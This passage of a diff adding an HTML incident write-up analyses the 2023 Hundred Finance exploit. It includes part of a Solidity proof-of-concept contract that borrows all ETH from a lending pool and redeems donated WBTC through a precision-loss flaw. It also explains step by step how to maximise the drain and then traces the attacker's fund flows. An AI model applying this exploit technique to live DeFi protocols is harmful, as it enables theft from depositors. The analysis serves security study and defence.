+</span><span id="__span-2-51"><a id="__codelineno-2-51" name="__codelineno-2-51" href="#__codelineno-2-51"></a><span class="w">        </span>comptroller<span class="p">.</span>enterMarkets<span class="p">(</span>cTokens<span class="p">);</span>
+</span><span id="__span-2-52"><a id="__codelineno-2-52" name="__codelineno-2-52" href="#__codelineno-2-52"></a>
+</span><span id="__span-2-53"><a id="__codelineno-2-53" name="__codelineno-2-53" href="#__codelineno-2-53"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">cWBTCAmountIn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">;</span>
+</span><span id="__span-2-54"><a id="__codelineno-2-54" name="__codelineno-2-54" href="#__codelineno-2-54"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">exchangeRate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>hWBTC<span class="p">.</span>exchangeRateStored<span class="p">();</span>
+</span><span id="__span-2-55"><a id="__codelineno-2-55" name="__codelineno-2-55" href="#__codelineno-2-55"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">precisionLossMaxAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span>cWBTCAmountIn<span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span>exchangeRate<span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="err">1</span>e18<span class="p">;</span>
+</span><span id="__span-2-56"><a id="__codelineno-2-56" name="__codelineno-2-56" href="#__codelineno-2-56"></a><span class="w">        </span>console<span class="p">.</span>log<span class="p">(</span><span class="s2">&quot;precisionLossMaxAmount:&quot;</span><span class="p">,</span><span class="w"> </span>precisionLossMaxAmount<span class="p">);</span>
+</span><span id="__span-2-57"><a id="__codelineno-2-57" name="__codelineno-2-57" href="#__codelineno-2-57"></a>
+</span><span id="__span-2-58"><a id="__codelineno-2-58" name="__codelineno-2-58" href="#__codelineno-2-58"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">borrowAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>hEther<span class="p">.</span>getCash<span class="p">();</span>
+</span><span id="__span-2-59"><a id="__codelineno-2-59" name="__codelineno-2-59" href="#__codelineno-2-59"></a><span class="w">        </span>hEther<span class="p">.</span>borrow<span class="p">(</span>borrowAmount<span class="p">);</span><span class="w"> </span><span class="c1">// using cWBTC as collateral to lend ETH</span>
+</span><span id="__span-2-60"><a id="__codelineno-2-60" name="__codelineno-2-60" href="#__codelineno-2-60"></a><span class="w">        </span><span class="kt">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="k">msg.sender</span><span class="p">)).</span>transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">).</span>balance<span class="p">);</span>
+</span><span id="__span-2-61"><a id="__codelineno-2-61" name="__codelineno-2-61" href="#__codelineno-2-61"></a>
+</span><span id="__span-2-62"><a id="__codelineno-2-62" name="__codelineno-2-62" href="#__codelineno-2-62"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">redeemAmount</span><span class="p">;</span>
+</span><span id="__span-2-63"><a id="__codelineno-2-63" name="__codelineno-2-63" href="#__codelineno-2-63"></a><span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>precisionLossMaxAmount<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span>donationAmount<span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-64"><a id="__codelineno-2-64" name="__codelineno-2-64" href="#__codelineno-2-64"></a><span class="w">            </span>redeemAmount<span class="w"> </span><span class="o">=</span><span class="w"> </span>donationAmount<span class="p">;</span>
+</span><span id="__span-2-65"><a id="__codelineno-2-65" name="__codelineno-2-65" href="#__codelineno-2-65"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-66"><a id="__codelineno-2-66" name="__codelineno-2-66" href="#__codelineno-2-66"></a><span class="w">            </span>redeemAmount<span class="w"> </span><span class="o">=</span><span class="w"> </span>precisionLossMaxAmount<span class="p">;</span>
+</span><span id="__span-2-67"><a id="__codelineno-2-67" name="__codelineno-2-67" href="#__codelineno-2-67"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-2-68"><a id="__codelineno-2-68" name="__codelineno-2-68" href="#__codelineno-2-68"></a><span class="w">        </span>console<span class="p">.</span>log<span class="p">(</span><span class="s2">&quot;redeemAmount:&quot;</span><span class="p">,</span><span class="w"> </span>redeemAmount<span class="p">);</span>
+</span><span id="__span-2-69"><a id="__codelineno-2-69" name="__codelineno-2-69" href="#__codelineno-2-69"></a><span class="w">        </span>hWBTC<span class="p">.</span>redeemUnderlying<span class="p">(</span>redeemAmount<span class="p">);</span><span class="w">  </span><span class="c1">// due to precision loss, only 1hWBTC was used to redeem all WBTCs</span>
+</span><span id="__span-2-70"><a id="__codelineno-2-70" name="__codelineno-2-70" href="#__codelineno-2-70"></a>
+</span><span id="__span-2-71"><a id="__codelineno-2-71" name="__codelineno-2-71" href="#__codelineno-2-71"></a><span class="w">        </span>WBTC<span class="p">.</span>transfer<span class="p">(</span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span>WBTC<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)));</span>
+</span><span id="__span-2-72"><a id="__codelineno-2-72" name="__codelineno-2-72" href="#__codelineno-2-72"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-2-73"><a id="__codelineno-2-73" name="__codelineno-2-73" href="#__codelineno-2-73"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>It should be noted that since hWBTC is an empty market and does not hold much WBTC itself, utilizing precision loss alone cannot directly profit from the hWBTC contract. Therefore, a different approach is needed. The attacker can first <code>mint</code> a small amount of hWBTC, then transfer a large amount of WBTC to the hWBTC contract. At this point, the exchangeRate is extremely high, so the hWBTC can be used as collateral to borrow tokens from other pools, thus emptying them. Later, due to precision loss, the attacker can use <code>redeem</code> to withdraw the previously transferred WBTC without using all the hWBTC, while bypassing the liquidity check on the account during <code>redeem</code>. Namely, the portion of precision loss is used as collateral to borrow tokens from other pools, thus profiting.</p>
+<p>Specifically, according to the previous analysis, to maximize the profit from precision loss, the smaller the amount of hWBTC obtained after <code>mint</code>, i.e., the smaller the totalSupply of hWBTC, the better. One can <code>mint</code> first and then <code>redeem</code> to retain a small amount of hWBTC. In reality, the attacker obtained 2 hWBTC, not the minimum 1 hWBTC. Observing the code of newer versions of the Compound v2, it can be found that the <code>redeem</code> function will call the following <code>redeemVerify</code> function at the end, which can prevent the attacker from passing in 0 hWBTC when using precision loss. However, in the version of the contract used by Hundred Finance, no such verification exists. Thus, in reality, it is possible to <code>mint</code> only the minimum 1 hWBTC for the attack, achieving greater profit (although there are not so many funds in other pools).</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">redeemVerify</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">cToken</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">redeemer</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="nv">redeemAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="nv">redeemTokens</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">    </span><span class="c1">// Shh - currently unused</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span>cToken<span class="p">;</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span>redeemer<span class="p">;</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">    </span><span class="c1">// Require tokens is zero or amount is also zero</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>redeemTokens<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>redeemAmount<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">        </span>revert<span class="p">(</span><span class="s2">&quot;redeemTokens zero&quot;</span><span class="p">);</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>After obtaining a small amount of hWBTC, a large amount of WBTC is transferred to the hWBTC contract to raise the exchangeRate, and then all ETH is borrowed from the hEther contract. Finally, using precision loss, all previously transferred WBTC can be redeemed, while bypassing the liquidity checks. (That is, the <code>Comptroller</code> contract's <code>getHypotheticalAccountLiquidityInternal</code> function only considers the attacker <code>redeem</code> out 1 hWBTC worth of WBTC, but in reality, it is close to 2 hWBTC worth of WBTC.)</p>
+<p>Finally, the Drainer contract created is liquidated by <code>liquidateBorrow</code>, and then <code>redeem</code>, causing the hWBTC contract to become an empty market again, thus continuing to attack other token markets using hWBTC. The specific amount of ETH needed to liquidate 1 hWBTC can be deduced by the <code>liquidateCalculateSeizeTokens</code> function of the <code>Comptroller</code> contract, and also due to precision loss, the final amount needs to be increased by 1.</p>
+<h3 id="attack-flow">Attack Flow</h3>
+<p>Below is an analysis of the entire attack process of the <a href="https://optimistic.etherscan.io/address/0x155da45d374a286d383839b1ef27567a15e67528">attacker</a>.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/2516.png" /></p>
+<p>The attacker first transfers funds from the L1 mainnet to Optimism, totaling 4.1 ETH and 0.31 WBTC.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/3154.png" /></p>
+<p>Then, using 0.3 WBTC, mints about 0.15 hWBTC.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/3357.png" /></p>
+<p>The following 8 transactions are attacks on two sets of Hundred Finance protocols (not studied, maybe one old and one new?). After creating the attack contract, the attacker first transfers the previously obtained hWBTC to two contracts (one of which is actually useless). Then two calls are made, the first to launch the attack and the second to withdraw the profit.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/4310.png" /></p>
+<p>Then, Multichain and Fraxferry are used to send USDC, USDT, DAI, WBTC, ETH, and FRAX back to the Ethereum mainnet.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/4512.png" /></p>
+<p>On the <a href="https://etherscan.io/address/0x155da45d374a286d383839b1ef27567a15e67528">mainnet address</a>, funds were first obtained from Tornado Cash on April 11.</p>
+<p><img alt="" src="../../image/230415_HundredFinance.assets/5320.png" /></p>
+<p>After the attack was completed, the attacker exchanged USDT and USDC, which are subject to blacklist mechanisms, for other tokens through exchanges or by adding liquidity.</p>
+<p>As of the writing of this article, the attacker has not taken any further action, and all profits are still in the original address.</p>
+<h2 id="misc">Misc</h2>
+<h3 id="frontrunning-protection">Frontrunning Protection</h3>
+<p>According to the previous analysis, the attacker first <code>mint</code> a small amount of hWBTC before the AttackTx and then <code>redeem</code> it back to WBTC in the AttackTx, using it along with the 500 WBTC borrowed for the attack.</p>
+<p>This way, the attacker already occupied all the shares of the WBTC market before the actual attack, and the <code>redeem</code> calls involved, as well as the actual use of more WBTC than borrowed, can prevent frontrunning.</p>
+<h3 id="patch">Patch</h3>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testPatch</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">blockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">90843467</span><span class="p">;</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">    </span>vm<span class="p">.</span>createSelectFork<span class="p">(</span><span class="s2">&quot;optimism&quot;</span><span class="p">,</span><span class="w"> </span>blockNumber<span class="p">);</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">    </span>console<span class="p">.</span>log<span class="p">(</span><span class="s2">&quot;Mint Pause:&quot;</span><span class="p">,</span><span class="w"> </span>comptroller<span class="p">.</span>mintGuardianPaused<span class="p">(</span><span class="kt">address</span><span class="p">(</span>hWBTC<span class="p">)));</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Approximately 4 hours after the attack occurred, the project team initiated a <a href="https://optimistic.etherscan.io/tx/0xee3d2082ffd137f5faa4f57f9c14f994a769c92a8db0db4bbb0f8fb51369763f">transaction</a> to execute an emergency pause, which prohibited the minting of tokens related to the protocol, preventing further exploitation of the vulnerability.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../230126_TINU/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 230126-TINU">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                230126-TINU
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../230905_FloorDAO/" class="md-footer__link md-footer__link--next" aria-label="Next: 230905-FloorDAO">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                230905-FloorDAO
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.footer", "content.code.copy", "search.suggest", "search.highlight", "search.share"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../javascripts/katex.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/katex.min.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/contrib/auto-render.min.js"></script>
+      
+    
+  </body>
+</html>
